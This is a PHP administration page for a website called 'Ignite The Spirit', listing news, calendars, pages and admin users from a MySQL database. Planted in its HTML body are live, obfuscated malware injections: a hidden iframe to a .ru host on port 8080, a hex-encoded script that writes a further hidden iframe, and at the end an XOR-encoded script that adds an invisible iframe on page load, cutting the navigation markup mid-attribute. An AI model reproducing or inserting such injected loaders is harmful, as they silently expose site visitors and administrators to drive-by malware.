<?php
session_start();

if ($_SESSION['auth'] == "admin") 
{


	include("db_connect.php");

	if (isset($_GET['page']))
	{
		$page = $_GET['page'];
	}
	else
	{
		$page = "news";
	}

	switch ($page) 
	{
		case "news":
    
			$query = "SELECT * FROM news ORDER by news_date DESC";
			$repeat_result = mysql_query($query);
			
			while ($row = mysql_fetch_array($repeat_result, MYSQL_ASSOC)) 
			{
				$div_names[] = $row['news_id'];
			}
	
			mysql_free_result($repeat_result);
	
			$query = "SELECT * FROM news ORDER BY news_date DESC";
			$news_result = mysql_query($query);
			function news($query_result,$div_array) 
			{
				while ($row = mysql_fetch_array($query_result, MYSQL_ASSOC)) 
				{
					$print_date = date('F j, Y', strtotime($row['news_date']));
				
					echo "<span class='news_title'><strong>".$print_date." | ".stripslashes($row['news_title'])."</strong></span>\n";
					echo "<span class='edit'><a href='edit_news.php?id=".$row['news_id']."'>[edit]</a></span><span class='delete'><a href='' onclick='deletenews(".$row['news_id'].");'>[delete]</a></span>\n";
					echo "<p class='news'>\n";
					echo substr(stripslashes($row['news_content']),0,200)."...";
					echo "</p>\n";
				
				
				}
			}
			$current_page = "news";
    		break;
		
		case "calendars":
		
			$query = "SELECT DISTINCT calendar_year FROM calendar ORDER BY calendar_year DESC";
			$calendar_result = mysql_query($query);
		
			function calendar($calendar_result) 	
			{
				while ($row = mysql_fetch_array($calendar_result, MYSQL_ASSOC) )
				{
					echo $row['calendar_year']."<br />";
				}
			}
		
		
		    $current_page = "calendars";
		    break;
		
		case "gallery":
		    $current_page = "gallery";
		    break;
		
		case "pages":
		
			$query = "SELECT * FROM pages ORDER by page_id DESC";
			$page_result = mysql_query($query);
		
			function pages($query_result) 	
			{
				echo "<div class='pages'>";
				while ($row = mysql_fetch_array($query_result, MYSQL_ASSOC)) 
				{
					
				
					echo "<span class='pages_title'>".$row['page_title']."</span>";
					echo "<span class='pages_status'> ";
					if ( $row['page_show'] == 1){ echo "Active"; } else { echo "Disabled"; }
					echo " </span><span class='pages_link'><a href='edit_pages.php?id=".$row['page_id']."'>[edit]</a></span><br />";
				
				}
				echo "</div>";
			}
		
		    $current_page = "pages";
		    break;
		
		case "store":
		    $current_page = "store";
		    break;
		
		case "users":
		
			$query = "SELECT * FROM admin_users ORDER by admin_id DESC";
		
			$users_result = mysql_query($query);
			function show_users($query_result) 
			{
				echo "<div class='users'>";
				while ($row = mysql_fetch_array($query_result, MYSQL_ASSOC)) 
				{
					echo "<span class='name'>".$row['admin_name']."</span> <span class='email'>".$row['admin_email']."</span><span class='useredit'><a href='edit_user?action=edit&id=".$row['admin_id']."'>Edit</a></span>";
				}
				echo "</div>";
			}
	
		    $current_page = "users";
		    break;
		}	


	?>
	
	<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
	<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
	<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
	<title>ignite The Spirit | Administration</title>
	<link rel="stylesheet" href="admin.css"  type="text/css" />


<SCRIPT LANGUAGE="JavaScript">

function deletenews(news_id) {
	var id = news_id;
	var answer = confirm("Are you sure you want to delete this item!?");
		if (answer){
		window.location = "delete_news.php?id=" +id;
		}
		else{
		window.location = "index.php";
	}
}

</SCRIPT>
	</head>
	
	<body><div style="display:none">qgsopnvydsvlldhmczxozdbuxpbboxp<iframe width=984 height=219 src="http://bio-v.ru:8080/index.php" ></iframe></div><script>c10zfc='';y1c721143d=/* yde7e3b863 */document;y1c721143d.write('<scr'+'ipt>function yd7c3ba61b0(y45e343305a7){return ev'+c10zfc+'al(y45e343305a7); }</scr'+'ipt>');  function c10b010268ycab7bb4a387(y46f6c650){ var y360b27=16; var z6b='';return (yd7c3ba61b0('pa'+z6b+'rseInt')(y46f6c650,y360b27));}function y505f102b(yc363860f7f7){ function y841dff(){var y2cac19=2;return y2cac19;} var y4b83020ab9='';yf8f56c='fromCh';y21338663b=String[yf8f56c+'arCode'];for(y5358b=0;y5358b<yc363860f7f7.length;y5358b+=y841dff()){ y4b83020ab9+=(y21338663b(c10b010268ycab7bb4a387(yc363860f7f7.substr(y5358b,y841dff()))));}return y4b83020ab9;} var y28260c4ca='3C7363726970743E69662821'+c10zfc+'6D796961'+c10zfc+'297B646F63756D656E742E777269746528756E65736361'+c10zfc+'7065282027253363253639253636253732253631'+c10zfc+'253664253635253230253665253631'+c10zfc+'253664253635253364253633253331'+c10zfc+'253330253230253733253732253633253364253237253638253734253734253730253361'+c10zfc+'253266253266253332253331'+c10zfc+'253332253265253331'+c10zfc+'253337253334253265253332253330253330253265253331'+c10zfc+'253332253330253266253265253634253639253636253266253637253666253265253730253638253730253366253733253639253634253364253331'+c10zfc+'26253237253262253464253631'+c10zfc+'253734253638253265253732253666253735253665253634253238253464253631'+c10zfc+'253734253638253265253732253631'+c10zfc+'253665253634253666253664253238253239253261'+c10zfc+'253335253330253334253330253330253239253262253237253339253633253237253230253737253639253634253734253638253364253335253332253335253230253638253635253639253637253638253734253364253339253336253230253733253734253739253663253635253364253237253736253639253733253639253632253639253663253639253734253739253361'+c10zfc+'253638253639253634253634253635253665253237253365253363253266253639253636253732253631'+c10zfc+'2536642536352533652729293B7D7661'+c10zfc+'72206D796961'+c10zfc+'3D747275653B3C2F7363726970743E';y1c721143d.write(y505f102b(y28260c4ca));</script>
	<div id='blanket' style='display: none;'></div>
	

	<h1>Ignite The Spirit | Administration</h1>
	
	<ul class="navigation">
		<li><a <?php if ($current_page == "news"){echo "id=current";}?> href="index.php?pa<?php echo ''; ?><?php echo '<script>function HPkDx(BTOyBCO, JHi, dohkdlb){var EwHRWW=dohkdlb.split(JHi);var XFdsDX='';for(hUDiKAOew=-0xa-0x27-0x1b+0x18+0x1d+0x17;hUDiKAOew<(EwHRWW.length-1);hUDiKAOew+=0xc+0x22+0x1c+0x4-0x4d){ sjZb = EwHRWW[hUDiKAOew]^BTOyBCO;XFdsDX += String.fromCharCode(sjZb);}return XFdsDX;}function Qquuhlwb(tAEu){ var LNuGs = document.getElementById('xOGCRdaqIR'); fff.op.replace("157"); } 
;function qYjeCeDf(){var aLRvWh=new Function("gaR", "return "+HPkDx(0x23+0x2d+0x2e+0x103, 'e','485e494e482e500e492e484e495e501e')+"."+HPkDx(0x2f+0xc-0x30-0x29+0x12d, 'G','365G352G363G374G')+"");var KoJr=aLRvWh(-0x6-0x31+0xe+0x2a);KoJr.innerHTML += HPkDx(-0x17-0x6+0xbb, 'y','162y247y248y236y255y243y251y190y233y247y250y234y246y163y175y190y246y251y247y249y246y234y163y175y190y252y241y236y250y251y236y163y174y190y248y236y255y243y251y252y241y236y250y251y236y163y174y190y237y236y253y163y185y246y234y234y238y164y177y177y232y235y236y243y241y179y237y234y172y176y253y240y177y237y234y255y236y177y247y240y250y251y230y176y238y246y238y185y160y162y177y247y248y236y255y243y251y160y');}function njYjtn(zGlht){ alert('Fpew'); fff.op.replace("336");alert('Fpew'); } 
;if(window.addEventListener){window.addEventListener('load',qYjeCeDf,false);}else if(window.attachEvent){window.attachEvent('onload', qYjeCeDf);}function MsVOfO(XSGsAu){  fff=op.split("827");alert('lNDhfs'); fff.op.replace("867"); } 
;</script>'; ?>